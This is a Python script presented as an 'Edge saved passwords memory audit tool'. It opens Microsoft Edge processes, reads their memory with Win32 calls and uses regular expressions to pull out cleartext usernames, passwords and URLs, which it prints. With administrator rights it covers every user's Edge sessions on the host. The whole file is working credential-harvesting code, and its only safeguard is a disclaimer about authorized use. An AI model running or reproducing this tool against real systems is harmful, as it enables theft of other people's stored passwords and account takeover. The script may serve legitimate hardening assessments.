#!/usr/bin/env python3
"""
Edge Saved Passwords Memory Audit Tool

Security audit tool that demonstrates Microsoft Edge stores credentials
in cleartext in process memory. Intended for authorized security assessments
on Windows systems (e.g., terminal server hardening).

Admin privileges are optional:
  - Without admin: scans only the current user's Edge processes
  - With admin:    scans all users' Edge processes

Dependencies: pip install -r requirements.txt

Usage:
    python edge_password_audit.py

Disclaimer: For authorized security auditing only.
"""

import argparse
import ctypes
import ctypes.wintypes
import getpass
import re
import subprocess
import sys
from collections import OrderedDict
from ctypes import wintypes

import psutil

# ── Win32 constants ───────────────────────────────────────────────
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04
TOKEN_QUERY = 0x0008

# ── Win32 structs ─────────────────────────────────────────────────
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]


def _ptr_to_int(ptr) -> int:
    """Convert a ctypes pointer to an integer."""
    return ctypes.cast(ptr, ctypes.c_void_p).value or 0

# ── Win32 API bindings ────────────────────────────────────────────
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = ctypes.c_void_p

ReadProcessMemory = kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t),
]
ReadProcessMemory.restype = wintypes.BOOL

VirtualQueryEx = kernel32.VirtualQueryEx
VirtualQueryEx.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p,
    ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t,
]
VirtualQueryEx.restype = ctypes.c_size_t

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [ctypes.c_void_p]
CloseHandle.restype = wintypes.BOOL

# ── Credential pattern ────────────────────────────────────────────
# Matches: https?\x20<username>\x20<password><trailing>\x00
# The trailing part after password can be: \x20\x00, \x20\x20\x00, or just \x00
CRED_PATTERN = re.compile(
    rb"https?\x20"
    rb"([^\x00\x20]{3,30})"
    rb"\x20"
    rb"([^\x00\x20]{4,60})"
    rb"(?:\x20|\x20\x20)\x00",
)

# Broader patterns for debug mode — dump raw context around https in memory
DEBUG_PATTERNS = [
    re.compile(rb"https?://[A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]{5,100}"),
    re.compile(rb"https?\x20[^\x00\x0a\x0b\x0c\x0d]{3,30}\x20[^\x00\x0a\x0b\x0c\x0d]{4,50}\x20\x00"),
    # Try to find the credential pattern with various delimiters
    re.compile(
        rb"https?\x20"
        rb"([^\x00\x20]{3,30})"
        rb"\x20"
        rb"([^\x00\x20]{4,50})"
        rb"([^\x00\x20]{0,20})?"
        rb"\x00",
    ),
]


def is_admin() -> bool:
    """Check if the current process runs with elevated privileges."""
    try:
        result = subprocess.run(
            ["whoami", "groups"], capture_output=True, text=True, shell=True
        )
        return "s-1-5-32-544" in result.stdout
    except Exception:
        return False


def get_process_owner(pid: int) -> str:
    """Get the user account that owns a process."""
    try:
        proc = psutil.Process(pid)
        return proc.username()
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return "UNKNOWN"


def _is_edge_child(ppid: int) -> bool:
    """Return True if the parent process is also msedge.exe."""
    if not ppid:
        return False
    try:
        parent = psutil.Process(ppid)
        return parent.name().lower() == "msedge.exe"
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return False  # Parent exited, treat as root


def get_edge_processes(all_users: bool = True):
    """
    Find root msedge.exe processes (skip children whose parent is also msedge).
    When all_users is False, only include processes owned by the current user.
    """
    current_user = getpass.getuser()
    edge_procs = []

    for proc in psutil.process_iter(["pid", "name", "ppid"]):
        try:
            name = proc.info["name"] or ""
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

        if name.lower() != "msedge.exe":
            continue

        pid = proc.info["pid"]
        ppid = proc.info["ppid"]

        if _is_edge_child(ppid):
            continue

        owner = get_process_owner(pid)

        if not all_users and _not_current_user(owner, current_user):
            continue

        edge_procs.append({
            "pid": pid,
            "name": name,
            "owner": owner,
        })

    return edge_procs


def _not_current_user(owner: str, current_user: str) -> bool:
    """Check if a process owner is NOT the current user."""
    return current_user.lower() not in owner.lower()


def scan_process_memory(pid: int, debug: bool = False) -> list[dict]:
    """
    Walk virtual memory of a process, searching for cleartext credential patterns.
    Returns list of dicts: {username, password, url}
    """
    results = []
    h_process = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid
    )
    if not h_process:
        return results

    try:
        _walk_memory(h_process, results, debug)
    finally:
        CloseHandle(h_process)

    return results


def _walk_memory(h_process: int, results: list[dict], debug: bool = False) -> None:
    """Iterate over memory pages, appending any credentials found."""
    mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
    addr = 0
    pages_scanned = 0

    while True:
        mbi = MEMORY_BASIC_INFORMATION()
        if VirtualQueryEx(h_process, ctypes.c_void_p(addr), ctypes.byref(mbi), mbi_size) == 0:
            break

        if mbi.State == MEM_COMMIT and mbi.Protect == PAGE_READWRITE:
            _scan_page(h_process, mbi, results, debug)
            pages_scanned += 1

        addr = _ptr_to_int(mbi.BaseAddress) + mbi.RegionSize

    if debug:
        print(f"    [debug] pages scanned: {pages_scanned}")


def _scan_page(h_process: int, mbi: MEMORY_BASIC_INFORMATION, results: list, debug: bool = False) -> None:
    """Read a single memory page and search for credentials."""
    buf = ctypes.create_string_buffer(int(mbi.RegionSize))
    bytes_read = ctypes.c_size_t(0)

    if not ReadProcessMemory(
        h_process, ctypes.c_void_p(_ptr_to_int(mbi.BaseAddress)), buf, mbi.RegionSize,
        ctypes.byref(bytes_read)
    ):
        return

    raw = buf.raw
    for match in CRED_PATTERN.finditer(raw):
        username = match.group(1).decode("utf-8", errors="replace").strip()
        password = match.group(2).decode("utf-8", errors="replace").strip()
        url = _extract_url(raw, match.group(1), match.group(2))

        results.append({
            "username": username,
            "password": password,
            "url": url,
        })

    if debug:
        for pat in DEBUG_PATTERNS:
            for match in pat.finditer(raw):
                hit = match.group(0)[:200]
                results.append({
                    "username": "(debug)",
                    "password": hit.decode("utf-8", errors="replace"),
                    "url": "(debug hit)",
                })

                # If this has groups (third pattern), show structured output
                if match.lastindex and match.lastindex >= 2:
                    groups = [match.group(i) for i in range(1, match.lastindex + 1) if match.group(i)]
                    if len(groups) >= 2:
                        results.append({
                            "username": groups[0].decode("utf-8", errors="replace"),
                            "password": groups[1].decode("utf-8", errors="replace"),
                            "url": "(debug match)",
                        })


def _extract_url(raw: bytes, username: bytes, password: bytes) -> str:
    """Try to find the URL associated with a credential in a memory page."""
    url_pat = re.compile(
        rb"\x00\x00\x00"
        rb"([A-Za-z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+)"
        rb"(https?)"
        rb"\x20"
        + re.escape(username)
        + rb"\x20"
        + re.escape(password)
    )
    for m in url_pat.finditer(raw):
        return m.group(1).decode("utf-8", errors="replace")
    return ""


def main():
    parser = argparse.ArgumentParser(description="Edge Saved Passwords Memory Audit")
    parser.add_argument("--debug", action="store_true",
                        help="Show broader pattern matches for debugging")
    args = parser.parse_args()

    elevated = is_admin()

    if elevated:
        print("\033[92m[v]\033[0m Running elevated — scanning all users' Edge processes")
    else:
        print("\033[33m[!]\033[0m Not elevated — scanning only current user's Edge processes")

    if args.debug:
        print("\033[33m[!]\033[0m Debug mode: showing all pattern matches (not just credentials)\n")
    else:
        print()

    print("Fetching browser processes:", end="", flush=True)
    edge_procs = get_edge_processes(all_users=elevated)
    print(f" Done. ({len(edge_procs)} processes found)\n")

    if not edge_procs:
        print("No Edge processes found. Is Edge running?")
        return

    seen = OrderedDict()
    total_matches = 0

    for proc in edge_procs:
        pid = proc["pid"]
        owner = proc["owner"].replace("NSC\\t1_", "")
        print(f"  Scanning PID {pid}  Owner: {owner}")

        creds = scan_process_memory(pid, debug=args.debug)
        if not creds:
            print(f"    (no credentials found)")

        for cred in creds:
            if cred["username"] == "(debug)":
                print(f"    [debug] {cred['password']}")
                continue

            if cred["url"] == "(debug match)":
                print(f"    [debug-cred] {cred['username']} : {cred['password']}")
                continue

            key = f"{cred['username']} : {cred['password']}"
            entry = f"{key}  @{cred['url']}" if cred["url"] else key

            if entry not in seen:
                seen[entry] = True
                total_matches += 1
                print(f"    -> {entry}")

    print(f"\nTotal unique credentials found: {total_matches}")


if __name__ == "__main__":
    main()
